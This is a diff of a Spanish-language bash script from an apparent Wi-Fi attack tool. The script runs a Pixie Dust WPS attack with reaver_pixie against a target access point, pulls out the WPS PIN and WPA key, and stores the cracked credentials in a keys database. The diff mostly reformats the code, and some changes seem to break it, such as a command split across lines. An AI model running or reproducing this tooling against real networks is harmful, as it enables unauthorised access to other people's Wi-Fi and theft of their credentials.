@@ -1,30 +1,36 @@
 AnalizarLogPixiewps(){
   lineas_log=$(cat $ARCHIVO_TXT_ATAQUE | wc -l | awk {' print$1 '})
-  for A in `seq 1 $lineas_log` ; do 
+  for A in `seq 1 $lineas_log` ; 
+ do 
     linea=`head -$A $ARCHIVO_TXT_ATAQUE | tail -1`
-    if [[ $linea == *"WPS pin"* ]] 
-    then 
+  if [[ $linea == *"WPS pin"* ]] 
+  then 
       if [[ $linea == *"not found"* ]]
       then 
-	echo "$BSSID : ATAQUE FALLIDO, BSSID NO VULNERABLE A PIXIEWPS ATTACK" > $ARCHIVO_STATUSBAR
+	echo "$BSSID : ATAQUE FALLIDO, BSSID NO VULNERABLE A PIXIEWPS ATTACK" >$ARCHIVO_STATUSBAR
 	AgregarBssidDatabases 2
 	ATAQUE_ACABADO="SI"
-	if [ $ACTUALIZAR_SCAN = "SI" ]; then ProcesarDatosEscaneoAirodump; fi
+        if [ $ACTUALIZAR_SCAN = "SI" ];
+        then ProcesarDatosEscaneoAirodump;
+        fi
 	return 1
       fi
     PIN_WPS=`echo $linea | awk -F":" {' print $2 '} `
    
-    echo "$BSSID : PIN WPS CONSEGUIDO, RECUPERANDO CLAVE WPA, ESPERA ..." > $ARCHIVO_STATUSBAR
+    echo "$BSSID : PIN WPS CONSEGUIDO, RECUPERANDO CLAVE WPA, ESPERA ..." >$ARCHIVO_STATUSBAR
 
     X13="reaver_pixie -i $TARJETA_MODO_MONITOR -b $BSSID -a -D -c $CANAL -p $PIN_WPS"
 
-    reaver_pixie -i $TARJETA_MODO_MONITOR -b $BSSID -a -D -c $CANAL -p $PIN_WPS &>> $ARCHIVO_TXT_ATAQUE
+    reaver_pixie -i $TARJETA_MODO_MONITOR -b $BSSID -a -D -c $CANAL -p $PIN_WPS &>>$ARCHIVO_TXT_ATAQUE
 
     let vez=2
     if EsperarAcabarReaver
     then
-       if [ $ATAQUE_DETENIDO = "SI" ]; then return; fi	
-       RecuperarClaveWpa
+       if [ $ATAQUE_DETENIDO = "SI" ];
+       then 
+         return;
+       fi	
+      RecuperarClaveWpa
     else
       CLAVE_WPA="NO SE HA PODIDO RECUPERAR LA CLAVE WPA"
     fi
@@ -60,28 +66,32 @@ AnalizarLogPixiewps(){
     X2=$PIN_WPS
     X3="reaver_pixie -i $TARJETA_MODO_MONITOR -b $BSSID -a -D -c $CANAL -p $PIN_WPS"
     X4=$CARPETA_KEYS"$ESSID.DATOS"
-    (`sudo python "$RUTA_INFORME/PIXIEWPS.py" "$X1" $Pke $PKr $EHash1 $EHash2 $AuthKey $Enrollee $X2 "$X3" "$X4"`)
+    (`sudo python "$RUTA_INFORME/PIXIEWPS.py" "$X1" $Pke $PKr $EHash1 $EHash2 
+	$AuthKey $Enrollee $X2 "$X3" "$X4"`)
     #Fin Latex
     
     if ! grep -q $BSSID $ARCHIVO_DATABASE_KEYS
     then
-	if [ "$CLAVE_WPA" = "NO SE HA PODIDO RECUPERAR LA CLAVE WPA" ]; then CLAVE_WPA="?"; fi 
-	echo $ESSID"|"$BSSID"|"$PIN_WPS"|"$CLAVE_WPA"|"$fabricante"|"$modelo"|"$numero_de_modelo"|
-"$numero_de_serie"|"$device_name >> $ARCHIVO_DATABASE_KEYS
+        if [ "$CLAVE_WPA" = "NO SE HA PODIDO RECUPERAR LA CLAVE WPA" ];
+        then CLAVE_WPA="?"; 
+        fi 
+	 echo $ESSID"|"$BSSID"|"$PIN_WPS"|"$CLAVE_WPA"|"$fabricante"|"$modelo"|"$numero_de_modelo"|
+        "$numero_de_serie"|"$device_name >> $ARCHIVO_DATABASE_KEYS
     else
 	if [ $(grep $BSSID $ARCHIVO_DATABASE_KEYS | awk -F"|" {'print $4'}) = "?" ] && [ $CLAVE_WPA != "?" ] 
 	then
 	  sed '/'$BSSID'/d' $ARCHIVO_DATABASE_KEYS | sed '/^$/d' > TEMPORAL
 	  mv TEMPORAL $ARCHIVO_DATABASE_KEYS
 	  echo $ESSID"|"$BSSID"|"$PIN_WPS"|"$CLAVE_WPA"|"$fabricante"|"$modelo"|"$numero_de_modelo"|
-"$numero_de_serie"|"$device_name >> $ARCHIVO_DATABASE_KEYS
+          "$numero_de_serie"|"$device_name >> $ARCHIVO_DATABASE_KEYS
 	fi
     fi    
     echo "$BSSID : ATAQUE FINALIZADO, SE HA GENERADO EL ARCHIVO $ESSID.DATOS" > $ARCHIVO_STATUSBAR
-   
     AgregarBssidDatabases 3
     ATAQUE_ACABADO="SI"
-    if [ $ACTUALIZAR_SCAN = "SI" ]; then ProcesarDatosScaneo; fi
+    if [ $ACTUALIZAR_SCAN = "SI" ]; 
+    then ProcesarDatosScaneo;
+    fi
   fi 
 done
 unset lineas_log A linea PIN_WPS CLAVE_WPA fabricante modelo numero_de_modelo numero_de_serie device_name  
@@ -99,4 +109,3 @@ RecuperarClaveWpa() {
     fi
   done
 }
-
